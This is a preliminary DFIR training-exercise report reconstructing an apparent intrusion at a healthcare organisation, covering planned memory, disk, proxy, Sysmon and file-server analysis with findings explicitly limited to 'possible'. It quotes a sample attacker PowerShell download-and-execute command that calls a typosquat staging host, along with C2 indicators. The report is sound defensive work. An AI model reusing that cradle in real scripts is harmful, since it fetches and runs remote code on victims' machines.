# Forensic Findings: IR-2026-0420-01

**Case:** MedDefense — 72-hour intrusion reconstruction  
**Analyst:** Pedro Cabral (training exercise)  
**Reporting status:** **PRELIMINARY / EVIDENCE-LIMITED — NOT A COMPLETED FORENSIC EXAMINATION**  
**All times:** UTC (`Z`)  
**Classification:** Internal — IR/DFIR exercise

> **Evidence boundary:** Only `proxy_72h.sample.jsonl`, `sysmon_multihost.sample.jsonl`, `fileserver_access.sample.json`, and the Torres transcript are available here. The assignment explicitly identifies the `.sample` files as **schema references only**. The full `cs-ws-101.mem`, `cs-ws-101.dd`, `proxy_72h.jsonl`, `sysmon_multihost.jsonl`, and `fileserver_access.evtx` were **not provided**. Commands below are **to run**, not commands falsely claimed to have been executed. Output blocks are explicitly **sample illustrations**, not validated findings from original evidence. Conclusions are bounded accordingly. No sample-only observation is marked *confirmed* as an actual incident finding.

## 1. Evidence inventory and integrity gate

| ID | Artifact | Availability | Integrity / chain of custody |
|---|---|---|---|
| ART-001 | `cs-ws-101.mem` | Not supplied | Torres reports WinPmem acquisition at **2026-04-20 19:38Z**, written to evidence share **19:41Z**; no acquisition SHA-256 recorded. Baseline and analyst verification **PENDING**. |
| ART-002 | `cs-ws-101.dd` | Not supplied | Acquisition and SHA-256 **PENDING**. |
| ART-003 | `proxy_72h.jsonl` | Not supplied; schema sample only | Full-export hash and coverage **PENDING**. |
| ART-004 | `sysmon_multihost.jsonl` | Not supplied; schema sample only | Full-export hash and coverage **PENDING**. |
| ART-005 | `fileserver_access.evtx` | Not supplied; condensed JSON sample only | Original EVTX hash and event-count verification **PENDING**. |

### ART-001 verification — mandatory before analysis

```powershell
# On the evidence workstation; do not modify the original image.
Get-FileHash -Algorithm SHA256 '\\evidence\share\IR-2026-0420-01\cs-ws-101.mem'
Get-FileHash -Algorithm SHA256 'D:\IR-2026-0420-01\working\cs-ws-101.mem'
# Compare the two complete digests and record both in the CoC.
```

- `sha256_at_acquisition`: **NOT RECORDED** (Torres explicitly reported this).
- `sha256_at_analysis_start`: **NOT COMPUTED — file unavailable**.
- `sha256_matches_acquisition_baseline`: **CANNOT BE ASSERTED**; no acquisition hash exists.
- `working_copy_matches_preserved_original`: **PENDING** until both files are available and hashes match.
- `CoC entry updated`: **PENDING**; append the actual analyst, time, source/destination, tool version, hash and result to `evidence_preservation.md`.
- **Timing:** capture 19:38Z; share write 19:41Z (**3 minutes**); Torres call begins 19:43:18Z (**5 min 18 sec** after capture); simulated incident declaration 19:52Z (**14 minutes** after capture). These intervals refer to different events and must not be conflated.

## 2. Memory analysis — `cs-ws-101.mem` (Volatility 3)

**Precondition:** verified working copy and identified compatible Windows symbols. Commands below are pending execution. Volatility output syntax and available plugins depend on installed version and memory image.

### MEM-001 — Process ancestry: Office → PowerShell → suspicious executable

**Command to run:**
```bash
vol -f cs-ws-101.mem windows.pstree.PsTree
```
**Relevant illustrative output from the Sysmon schema sample (NOT Volatility output):**
```text
2026-04-17 14:17:52Z  WINWORD.EXE       PID 4921
2026-04-17 14:22:14Z  powershell.exe    PID 6201  PPID 4921
2026-04-17 14:23:14Z  svchost32.exe     PID 7318  PPID 6201
```
**Forensic conclusion:** The sample describes suspicious parent-child execution consistent with malicious document execution; the memory process tree and process survival at capture **remain unverified**.  
**ATT&CK:** T1204.002 (Malicious File), T1059.001 (PowerShell), T1036.005 (Match Legitimate Name or Location).  
**Certainty:** **possible** (schema-only; elevate after original-image corroboration).

### MEM-002 — PowerShell downloader command line

**Command to run:**
```bash
vol -f cs-ws-101.mem windows.cmdline.CmdLine
```
**Illustrative Sysmon sample field (NOT Volatility output):**
```text
powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://staging.office365-cdn.net/updates/inv_payload.ps1')"
```
**Conclusion:** The sample illustrates a PowerShell remote script download/execution pattern. Validate command line in the actual memory image and disk before calling it a confirmed finding.  
**ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer).  
**Certainty:** **possible**.

### MEM-003 — Active C2 connection at acquisition

**Command to run:**
```bash
vol -f cs-ws-101.mem windows.netscan.NetScan
```
**Illustrative historical Sysmon/proxy sample:**
```text
2026-04-20T19:32:04Z CS-WS-101 10.30.12.101 -> 45.152.66.114:443
process: C:\ProgramData\Microsoft\svchost32.exe; PID 7318
```
**Conclusion:** A connection appears in the schema sample six minutes before the memory capture; this **does not prove** a live TCP session at 19:38Z. Confirm local/remote endpoints, PID and state in `NetScan`.  
**ATT&CK:** T1071.001 (Web Protocols), possibly T1573 (Encrypted Channel; only if demonstrated).  
**Certainty:** **possible**.

### MEM-004 — Suspicious injected memory regions

**Command to run:**
```bash
vol -f cs-ws-101.mem windows.malfind.Malfind --pid 7318
# Optional: extract relevant VADs only after documenting plugin options and evidence destination.
vol -f cs-ws-101.mem windows.malfind.Malfind --help
```
**Relevant output:** `NOT AVAILABLE — no memory image analyzed`.  
**Conclusion:** A process name, beacon label or suspicious parentage alone cannot prove process injection. Look for executable private VADs, page permissions and content; corroborate with PE signatures/disassembly before attribution.  
**ATT&CK:** T1055 (Process Injection), **only if proven**.  
**Certainty:** **possible / unverified**.

### MEM-005 — Credential material / NTLM hashes

**Command to run:**
```bash
vol -f cs-ws-101.mem windows.hashdump.Hashdump
```
**Relevant output:** `NOT AVAILABLE — no memory image analyzed`. **Never paste credential hashes into this report or public GitHub.** Keep sensitive output in restricted evidence storage and record a sanitized summary (count, account labels, hash of the export).  
**Conclusion:** The sample Sysmon `process_access` event (PID 7318 → `lsass.exe`, granted access `0x1010`) raises suspicion but does **not** establish that hashes were successfully extracted. Note also that `Hashdump` targets accessible SAM/system credential material; it is not a blanket proof of NTLM credentials present in LSASS memory. Verify plugin prerequisites and use authorized, appropriate memory analysis for LSASS evidence.  
**ATT&CK:** T1003 (OS Credential Dumping); T1003.001 only if LSASS credential extraction is substantiated.  
**Certainty:** **possible**.

## 3. Disk analysis — `cs-ws-101.dd` (The Sleuth Kit)

**Precondition:** verified disk image; do not guess partition offset. Substitute `<START_SECTOR>` from `mmls`, and `<INODE>` from `fls`.

### DISK-001 — Partition and filesystem metadata

```bash
mmls cs-ws-101.dd
fsstat -o <START_SECTOR> cs-ws-101.dd
```
**Output:** `NOT AVAILABLE — disk image not supplied`.  
**Conclusion:** Partition layout, filesystem type and offsets cannot yet be asserted.  
**ATT&CK:** N/A — forensic acquisition/validation, not an adversary technique.  
**Certainty:** **possible / pending**.

### DISK-002 — Filesystem timeline (AppData, Temp, Windows\Tasks)

```bash
fls -r -m C: -o <START_SECTOR> cs-ws-101.dd > bodyfile.txt
mactime -b bodyfile.txt -d -z UTC > disk_timeline.csv
# Search paths and timestamps; use case-insensitive matching.
grep -Ei 'AppData|\\Temp\\|Windows/Tasks|Windows\\Tasks|Invoice_Q4_2025|inv_payload|svchost32|encryption_staging' disk_timeline.csv
```
**Output:** `NOT AVAILABLE — disk image not supplied`.  
**Conclusion:** Check MACB timestamps and correlate with process/network events. MACB metadata alone cannot establish execution, and NTFS timestamp manipulation is possible.  
**ATT&CK:** T1074 (Data Staged) only when staging is demonstrated; otherwise N/A.  
**Certainty:** **possible / pending**.

### DISK-003 — Extract and hash malicious document, downloader and beacon binary

```bash
# Locate candidates and record inode numbers first:
fls -r -p -o <START_SECTOR> cs-ws-101.dd | grep -Ei 'Invoice_Q4_2025\.docm|inv_payload\.ps1|svchost32\.(exe|dll)'
# Repeat for each verified inode; never invent inode values.
icat -o <START_SECTOR> cs-ws-101.dd <INODE_DOCM> > extracted/Invoice_Q4_2025.docm
icat -o <START_SECTOR> cs-ws-101.dd <INODE_PS1> > extracted/inv_payload.ps1
icat -o <START_SECTOR> cs-ws-101.dd <INODE_BEACON> > extracted/beacon_candidate.bin
sha256sum extracted/*
```
**Output:** `NOT AVAILABLE — disk image not supplied`; **no SHA-256 digests calculated**.  
**Conclusion:** The sample refers to a `.docm` and `svchost32.exe`; a separate on-disk PowerShell script and a **beacon DLL** are *not* established. The downloader may have run via `DownloadString` without a saved `.ps1`; the observed beacon candidate is an `.exe`, not proof of a DLL. Search for a DLL only if artifact evidence supports it; record `NOT FOUND` if absent.  
**ATT&CK:** T1204.002, T1105, T1036.005 (candidate mappings).  
**Certainty:** **possible**.

## 4. Proxy analysis — `proxy_72h.jsonl`

**Use the full log for findings.** The commands below operate on the specified JSONL schema; sample values shown only illustrate expected formatting.

### PROXY-001 — Phishing document retrieval / Thursday

```bash
jq -r 'select(.ts >= "2026-04-17T00:00:00Z" and .ts < "2026-04-18T00:00:00Z") | select((.download == true) or ((.url // "") | test("invoice|mail|download"; "i"))) | [.ts,.host,.user,.url,.filename,.status] | @tsv' proxy_72h.jsonl
```
**Schema illustration:** `2026-04-17T14:18:02Z  CS-WS-101  MEDDEFENSE\\jdoe  https://outlook.office.com/mail/download?id=AAMkAG-Invoice  Invoice_Q4_2025.docm  200`  
**Conclusion:** The sample shows a Word macro-enabled attachment download, **not** an independently verified malicious sender, email header, or spearphishing delivery chain. Correlate with mail gateway and document macro analysis.  
**ATT&CK:** T1566.001 (Spearphishing Attachment), candidate only.  
**Certainty:** **possible**.

### PROXY-002 — First C2 contact and frequency

```bash
jq -r 'select((.dst_ip // "") == "45.152.66.114" or ((.url // "") | contains("staging.office365-cdn.net"))) | [.ts,.host,.src_ip,.dst_ip,.method,.bytes,.beacon_pattern] | @tsv' proxy_72h.jsonl | sort
# For the full dataset, compute per-host inter-arrival intervals, not just sample gaps:
jq -r 'select((.dst_ip // "") == "45.152.66.114") | [.host,.ts] | @tsv' proxy_72h.jsonl | sort -k1,1 -k2,2
```
**Schema illustration:** first C2 `2026-04-17T14:23:07Z`; later sample `beacon_pattern=sleep_60s_jitter_10pct`.  
**Conclusion:** A regular beacon interval must be measured from the **full 72-hour dataset**. The condensed sample cannot validate 60-second periodicity.  
**ATT&CK:** T1071.001 (Web Protocols).  
**Certainty:** **possible**.

### PROXY-003 — Large transfers and possible exfiltration

```bash
jq -r 'select((.bytes // 0) >= 1000000) | [.ts,.host,.src_ip,.dst_ip,.url,.method,.bytes] | @tsv' proxy_72h.jsonl | sort
jq -r 'select(.host == "FILE-SVR-01") | [.ts,.url,.dst_ip,.bytes] | @tsv' proxy_72h.jsonl
```
**Schema illustration:** `2026-04-19T02:14:22Z FILE-SVR-01 45.152.66.114 bytes=2400412`.  
**Conclusion:** This sample is especially important because it also depicts `FILE-SVR-01` contacting C2, **contradicting the earlier working assumption that the file server had no beacon**. It must be escalated for verification. A `bytes` field does not necessarily indicate **outbound** transfer; confirm proxy field semantics, direction, HTTP/TLS details, destination and transfer volume. No confirmed exfiltration can be claimed.  
**ATT&CK:** T1041 (Exfiltration Over C2 Channel), only if outbound transfer is validated.  
**Certainty:** **possible**.

## 5. Sysmon analysis — `sysmon_multihost.jsonl`

### SYS-001 — Process lineage and suspicious persistence

```bash
jq -r 'select(.event_id == 1 or .event_id == 13) | [.ts,.host,.event_id,.image,.parent_image,.cmdline,.target_object,.details] | @tsv' sysmon_multihost.jsonl
```
**Schema illustration:** `2026-04-17T14:23:28Z CS-WS-101 event 13 HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHealthSvc\\ImagePath -> C:\\ProgramData\\Microsoft\\svchost32.exe`.  
**Conclusion:** Sample suggests persistence through a Windows service registry key. Confirm service installation in Security/System event logs (e.g. System Event ID 7045), EDR alert details and original host records; **Sysmon Event ID 13 is a registry-value modification, not itself a service-installation event**.  
**ATT&CK:** T1543.003 (Windows Service), T1036.005.  
**Certainty:** **possible**.

### SYS-002 — Lateral movement to WS-104, WS-107, WS-112

```bash
jq -r 'select((.host | IN("CS-WS-104","CS-WS-107","CS-WS-112")) and (.event_id == 1 or .event_id == 3)) | [.ts,.host,.event_id,.user,.image,.cmdline,.dst_ip,.dst_port,.logon_type] | @tsv' sysmon_multihost.jsonl | sort
```
**Schema illustration:** `2026-04-19T00:03:44Z CS-WS-104 cmd.exe /c sc create WinHealthSvc ... logon_type=3`; outbound connections appear for WS-104/107/112 in the sample.  
**Conclusion:** This is consistent with remote service execution/lateral movement, but **NTLM authentication is not proven** by `logon_type=3` alone. Correlate Windows Security Event IDs 4624/4648/4672 and their `AuthenticationPackageName` plus source IP/logon ID, and verify on all three hosts.  
**ATT&CK:** T1021.002 (SMB/Windows Admin Shares) and T1569.002 (Service Execution) only if transport/execution corroborated; T1078 (Valid Accounts) as a candidate.  
**Certainty:** **possible**.

### SYS-003 — Ransomware staging on four workstations

```bash
jq -r 'select(.event_id == 11 and ((.target // "") | test("encryption_staging\\.(ps1|bat)$";"i"))) | [.ts,.host,.image,.pid,.target] | @tsv' sysmon_multihost.jsonl | sort
```
**Schema illustration:** `.ps1` created on `CS-WS-101` (14:23:18Z), `104` (14:25:02Z), `107` (14:25:42Z), `112` (14:26:14Z) on 2026-04-20.  
**Conclusion:** The sample depicts file creation by `svchost32.exe`, **not** `cmd.exe`/`powershell.exe` writing the scripts. Creation alone does not prove execution or encryption. Inspect the actual script contents, hashes, file writes and execution telemetry.  
**ATT&CK:** T1486 (Data Encrypted for Impact) **not observed**; staging is preparatory behavior only.  
**Certainty:** **possible**.

### SYS-004 — Service installation matching SIEM alert

```bash
jq -r 'select((.cmdline // "" | test("sc create|WinHealthSvc";"i")) or ((.target_object // "") | contains("WinHealthSvc"))) | [.ts,.host,.event_id,.image,.cmdline,.target_object] | @tsv' sysmon_multihost.jsonl
# In full Windows System logs: filter Event ID 7045 and correlate host, service, image path and UTC time.
```
**Schema illustration:** `WinHealthSvc` at CS-WS-101 and a `sc create` command at CS-WS-104. The transcript reports SIEM rule `wz-edr-200214` on WS-104/107/112.  
**Conclusion:** Correlation is required; the sample does not show 7045 events for all three workstations.  
**ATT&CK:** T1543.003.  
**Certainty:** **possible**.

### SYS-005 — Additional host: SCHED-SVR-01

```bash
jq -r 'select(.host == "SCHED-SVR-01") | [.ts,.event_id,.image,.parent_image,.cmdline] | @tsv' sysmon_multihost.jsonl
```
**Schema illustration:** `2026-04-20T18:02:18Z SCHED-SVR-01 svchost32.exe PID 5920`.  
**Conclusion:** The sample indicates a **sixth potentially affected system**. It was mentioned by Torres as overloaded but not included in the five-host acquisition scope. Escalate scope expansion and preserve its telemetry; do not silently omit it.  
**ATT&CK:** T1543.003 / T1036.005 (candidate only).  
**Certainty:** **possible**.

## 6. File-server analysis — `fileserver_access.evtx`

### FILE-001 — Access window, account and number of events

```bash
# Export original EVTX to JSON with the installed converter; record version and SHA-256.
evtx_dump -o json fileserver_access.evtx > fileserver_access.full.json
# If converter emits one JSON event per line, normalize into fields ts,event_id,user,logon_id,object_name,access_mask.
# Example query for a normalized JSONL export:
jq -r 'select(.event_id == 4663) | [.ts,.user,.logon_id,.object_name,.access_mask] | @tsv' fileserver_access.normalized.jsonl | sort
jq -s '[.[] | select(.event_id == 4663)] | length' fileserver_access.normalized.jsonl
jq -r 'select(.event_id == 4663) | .object_name' fileserver_access.normalized.jsonl | sort | uniq -c
```
**Schema illustration (condensed sample summary, NOT full-log recount):**
```text
Window: 2026-04-19T02:14:01Z – 2026-04-19T02:41:12Z
Event ID: 4663 / ReadData (0x1)
Summary count: 1,847 events (reported, not independently recounted)
Account: MEDDEFENSE\jdoe; logon ID 0xAF12C4B8
Folders: D:\clinical\labs\ and D:\clinical\notes\
File types in summary: 1,847 PDF; 0 DOCX; 0 XLSX
```
**Conclusion:** The sample reports 1,847 **object-access events**, which are **not automatically 1,847 unique patient records**. Unique file counts, per-path categories, per-minute activity and any duplicate events require the full EVTX. Access mask and process image are consistent with read activity, but exfiltration requires separate network proof.  
**ATT&CK:** T1005 (Data from Local System) or T1039 (Data from Network Shared Drive), depending on validated access mechanism.  
**Certainty:** **possible** (sample-only).

### FILE-002 — Clinical account and authentication mechanism

```bash
# Inspect normalized 4624/4634 events and correlate by logon_id.
jq -r 'select(.event_id == 4624 or .event_id == 4634) | [.ts,.event_id,.user,.logon_id,.logon_type,.src_ip,.auth_package] | @tsv' fileserver_access.normalized.jsonl
```
**Schema illustration:** 4624 network logon at `2026-04-19T02:14:00.842Z` for `MEDDEFENSE\jdoe`, logon type 3, source `10.30.12.101`, authentication package **Kerberos**; logoff 02:41:18Z.  
**Conclusion:** Do **not** mislabel this file-server authentication as NTLM: the supplied sample explicitly says **Kerberos**. `jdoe` is described as a scheduling coordinator, not an authorized clinical-document reader; verify role and ACL records. No additional clinical accounts can be identified from this condensed sample.  
**ATT&CK:** T1078 (Valid Accounts), T1039 (candidate).  
**Certainty:** **possible** (sample-only).

## 7. Attack chain summary — hypotheses pending full-artifact validation

| Stage | UTC time/range illustrated in samples | ATT&CK technique (candidate) | Hosts | Evidence source / finding | Certainty |
|---|---|---|---|---|---|
| Email attachment retrieval | 2026-04-17 14:18Z | T1566.001 | CS-WS-101 | Proxy sample / PROXY-001 | possible |
| Office launches PowerShell | 2026-04-17 14:17–14:22Z | T1204.002, T1059.001 | CS-WS-101 | Sysmon sample / MEM-001, MEM-002 | possible |
| Payload download and suspicious executable | 2026-04-17 14:22–14:23Z | T1105, T1036.005 | CS-WS-101 | Proxy + Sysmon samples / DISK-003 | possible |
| Service persistence | 2026-04-17 14:23Z | T1543.003 | CS-WS-101 | Sysmon sample / SYS-001 | possible |
| C2 communication | 2026-04-17 14:23Z–2026-04-20 19:32Z (sampled) | T1071.001 | CS-WS-101 | Proxy + Sysmon samples / PROXY-002, MEM-003 | possible |
| Credential access attempt | 2026-04-17 14:25Z | T1003 (candidate) | CS-WS-101 | Sysmon sample / MEM-005 | possible |
| Lateral service activity | 2026-04-19 00:03–00:18Z | T1569.002, T1078 | CS-WS-104/107/112 | Sysmon + proxy samples / SYS-002 | possible |
| File-server suspicious process / C2 | 2026-04-19 02:14–02:41Z | T1071.001, T1036.005 | FILE-SVR-01 | Sysmon + proxy samples / PROXY-003 | possible |
| Clinical file access | 2026-04-19 02:14–02:41Z | T1039 | FILE-SVR-01 | Condensed EVTX JSON / FILE-001, FILE-002 | possible |
| Possible outbound data transfer | 2026-04-19 02:14Z | T1041 (unproven) | FILE-SVR-01 | Proxy sample / PROXY-003 | possible |
| Ransomware script staging (not execution) | 2026-04-20 14:23–14:26Z | No T1486 claim | Four workstations | Sysmon sample / SYS-003 | possible |
| Additional suspicious scheduling-server process | 2026-04-20 18:02Z | T1036.005 (candidate) | SCHED-SVR-01 | Sysmon sample / SYS-005 | possible |
| Last illustrated beacon before memory capture | 2026-04-20 19:32Z | T1071.001 | CS-WS-101 | Proxy + Sysmon samples / MEM-003 | possible |
| Memory acquisition (source-reported) | 2026-04-20 19:38Z | N/A | CS-WS-101 | Torres transcript / ART-001 | **confirmed as reported in transcript**, integrity pending |

## 8. Material inconsistencies and investigation decisions

1. **FILE-SVR-01 is not safely assumed beacon-free:** The sample includes a `svchost32.exe` process and proxy C2 connections on the file server; the earlier Task 2 premise says it has no active beacon. This is a **lead requiring verification**, not grounds to assert confirmed file-server C2.
2. **SCHED-SVR-01 may be a sixth affected asset:** the Sysmon sample includes a suspicious process; expand triage and preservation scope if verified.
3. **Authentication protocol:** File-server 4624 explicitly lists **Kerberos**, whereas the task asks to investigate NTLM movement. Validate protocol per target; do not infer NTLM from Logon Type 3.
4. **Patient records vs events:** 1,847 is the sample's *reported 4663 event count*, not a verified number of unique patients or exfiltrated files.
5. **Cobalt Strike and injected code:** Tooling and malware family need actual memory/binary examination; samples cannot prove an injected beacon DLL.
6. **No acquisition hash:** ART-001 cannot be claimed to match an acquisition baseline that was never recorded. Compute a current baseline and verify subsequent copies, documenting this limitation.

## 9. Completion criteria before issuing a final forensic report

- [ ] Receive original images and complete logs; register custody, sizes, acquisition provenance and SHA-256.
- [ ] Verify working copies and run all Volatility plugins; retain actual output, command versions and timestamps.
- [ ] Determine partition offsets and extract disk artifacts; record actual SHA-256 and recovered file contents.
- [ ] Re-run proxy/Sysmon queries against full 72-hour logs; measure beacon periodicity and investigate transfer direction.
- [ ] Recount original EVTX Event ID 4663, unique paths, time distribution and authenticated accounts.
- [ ] Investigate `FILE-SVR-01` C2 lead and `SCHED-SVR-01` scope expansion; amend containment and incident timeline as evidence warrants.
- [ ] Upgrade individual certainty ratings only with referenced original evidence and record the exact output excerpts.

**Bottom line:** This document is a reproducible forensic analysis plan with schema-derived investigative leads. It is **not** proof that the full attack chain was forensically verified.
